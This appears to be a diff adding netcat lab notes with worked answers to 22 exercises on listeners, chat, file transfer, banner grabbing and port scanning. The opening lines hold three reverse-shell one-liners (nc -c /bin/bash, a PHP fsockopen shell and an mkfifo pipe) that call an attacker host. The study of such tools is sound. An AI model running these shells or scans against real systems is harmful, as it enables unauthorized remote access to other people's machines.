@@ -1,0 +1,201 @@
+====================== NETCAT LAB ======================
+
+attacker - nc -lvnp 4444
+target - nc <ATTACKER_IP> 4444 -c /bin/bash
+
+php - php -r '$sock=fsockopen("10.10.17.1",1337); exec("/bin/sh -i <&3 >&3 2>&3");'
+
+netcat-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+
+
+
+Q1. Start TCP Listener
+
+Machine 1 (Server):
+nc -lvnp 4444
+
+Machine 2 (Client):
+nc <SERVER_IP> 4444
+
+--------------------------------------------------------
+
+Q2. Listener Verify
+
+ss -tulnp | grep 4444
+
+OR
+
+netstat -tulnp | grep 4444
+
+--------------------------------------------------------
+
+Q3. Send Message
+
+Server:
+nc -lvnp 4444
+
+Client:
+nc <SERVER_IP> 4444
+
+Type:
+Hello CDAC
+
+--------------------------------------------------------
+
+Q4. One Way Chat
+
+Server:
+nc -lvnp 4444
+
+Client:
+nc <SERVER_IP> 4444
+
+--------------------------------------------------------
+
+Q5. Two Way Chat
+
+Server:
+nc -lvnp 4444
+
+Client:
+nc <SERVER_IP> 4444
+
+(Type messages on both machines)
+
+--------------------------------------------------------
+
+Q6. Transfer Text File
+
+Receiver:
+nc -lvnp 4444 > received.txt
+
+Sender:
+nc <SERVER_IP> 4444 < file.txt
+
+--------------------------------------------------------
+
+Q7. Transfer Image / PDF
+
+Receiver:
+nc -lvnp 4444 > image.jpg
+
+Sender:
+nc <SERVER_IP> 4444 < image.jpg
+
+(For PDF replace image.jpg with file.pdf)
+
+--------------------------------------------------------
+
+Q8. Verify File Transfer
+
+ls -lh received.txt
+
+OR
+
+md5sum file.txt received.txt
+
+--------------------------------------------------------
+
+Q9. Read Input From File
+
+nc <SERVER_IP> 4444 < input.txt
+
+--------------------------------------------------------
+
+Q10. Save Received Data
+
+nc -lvnp 4444 > output.txt
+
+--------------------------------------------------------
+
+Q11. Banner Grabbing (HTTP)
+
+nc <TARGET_IP> 80
+
+Type:
+
+HEAD / HTTP/1.1
+Host: <TARGET_IP>
+
+(Press Enter twice)
+
+--------------------------------------------------------
+
+Q12. HTTP GET Request
+
+nc <TARGET_IP> 80
+
+Type:
+
+GET / HTTP/1.1
+Host: <TARGET_IP>
+
+(Press Enter twice)
+
+--------------------------------------------------------
+
+Q13. Retrieve HTTP Headers Only
+
+printf "HEAD / HTTP/1.1\r\nHost: <TARGET_IP>\r\n\r\n" | nc <TARGET_IP> 80
+
+--------------------------------------------------------
+
+Q14. Banner Grab FTP
+
+nc <TARGET_IP> 21
+
+--------------------------------------------------------
+
+Q15. Banner Grab SSH
+
+nc <TARGET_IP> 22
+
+--------------------------------------------------------
+
+Q16. Check SSH Port
+
+nc -zv <TARGET_IP> 22
+
+--------------------------------------------------------
+
+Q17. Check HTTP Port
+
+nc -zv <TARGET_IP> 80
+
+--------------------------------------------------------
+
+Q18. Scan Multiple Ports
+
+nc -zv <TARGET_IP> 21 22 23 80 443
+
+--------------------------------------------------------
+
+Q19. Scan Port Range
+
+nc -zv <TARGET_IP> 20-100
+
+--------------------------------------------------------
+
+Q20. UDP Listener
+
+Receiver:
+nc -luvp 5555
+
+Sender:
+echo "Hello UDP" | nc -u <SERVER_IP> 5555
+
+--------------------------------------------------------
+
+Q21. Connection Timeout
+
+nc -zvw5 <TARGET_IP> 22
+
+--------------------------------------------------------
+
+Q22. Verbose Mode
+
+nc -vz <TARGET_IP> 22
+
+--------------------------------------------------------
+
+
